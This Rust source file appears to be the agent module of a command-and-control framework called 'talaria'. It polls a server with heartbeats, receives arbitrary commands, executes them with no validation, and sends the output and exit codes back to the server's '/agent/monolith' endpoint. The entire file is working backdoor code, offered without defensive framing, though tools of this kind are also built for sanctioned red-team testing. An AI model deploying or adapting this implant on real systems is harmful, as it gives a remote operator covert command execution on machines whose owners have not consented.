use crate::agent::AgentContext;
use talaria::helper::*;
use talaria::protocol::*;

use anyhow::Result;
use std::process::Command;
use std::process::Output;

pub async fn handle_response(agent: &mut AgentContext, response: AgentInstruction) -> Result<()> {
    match response.packet_body {
        AgentInstructionBody::Command {
            ref command,
            ref command_id,
            ref args,
        } => {
            devlog!(
                "Executing Command: {:?}, ID: {:?}, Args: {:?}",
                command,
                command_id,
                args
            );

            // Execute the received command with arguments
            let output: Output = Command::new(command).args(args).output()?;

            // Capture stdout, stderr, and status code
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            let status_code = output.status.code().unwrap_or(-1); // Fallback to -1 if exit code is not available

            // Print the output for debugging
            devlog!("Command Output: \nSTDOUT: {}\nSTDERR: {}", stdout, stderr);

            // Prepare the response to send back to the server
            let agent_response = AgentResponse {
                packet_header: agent.generate_packet_header(),
                packet_body: AgentResponseBody::CommandResponse {
                    command: command.to_string(),
                    command_id: *command_id,
                    status_code,
                    stdout, // Send the actual command output (stdout) as the response
                    stderr,
                },
            };

            // Send the response back to the server with the actual command output
            make_request(agent, agent_response).await?;
        }
        AgentInstructionBody::RequestHeartbeat => {
            devlog!("Received heartbeat request from server.");
        }
        AgentInstructionBody::Ok => {
            devlog!("Server acknowledged previous operation.");
        }
    }

    devlog!("Processed Response: {:#?}", response);
    Ok(())
}

/// Sends a heartbeat to the server.
pub async fn send_heartbeat(agent: &mut AgentContext) -> Result<AgentInstruction> {
    let response = AgentResponse {
        packet_header: agent.generate_packet_header(),
        packet_body: AgentResponseBody::Heartbeat,
    };

    make_request(agent, response).await
}

/// Serializes and sends an AgentResponse,
/// returns a deserialized AgentInstruction
async fn make_request(
    agent: &mut AgentContext,
    request: AgentResponse,
) -> Result<AgentInstruction> {
    let request = AgentResponse::serialize(&request);
    let response = agent
        .http_client
        .post(agent.url() + "/agent/monolith")
        .body(request?)
        .send()
        .await?;

    let bytes = response.bytes().await?;
    let instruction = AgentInstruction::deserialize(&bytes.to_vec());
    Ok(instruction?)
}
